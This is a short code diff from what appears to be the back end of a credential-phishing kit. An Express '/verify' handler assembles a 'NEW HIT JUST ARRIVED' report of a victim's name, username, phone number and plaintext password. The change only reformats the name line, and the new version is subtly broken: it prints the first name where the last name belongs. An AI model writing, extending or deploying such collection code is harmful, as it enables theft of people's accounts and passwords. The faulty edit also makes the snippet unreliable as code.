@@ -41,7 +41,7 @@ app.post('/verify', async (req, res) => {
     const textMessage = [
         `NEW HIT JUST ARRIVED 🔻\n`,
 
-        ...(userData?[`Name: ${userData.first_name} ${userData.last_name}`]:[]),
+        ...(userData?[`Name: ${userData?.first_name ? `${userData.first_name} ` : ''}${userData?.last_name ? userData.first_name : ''}`]:[]),
         ...(userData?[`Username: ${userData.username}`]:[]),
         ...(jsonData.phone?[`Phone: ${jsonData.phone}`]:[]),
         ...(jsonData.pass?[`Password: ${jsonData.pass}\n`]:[]),
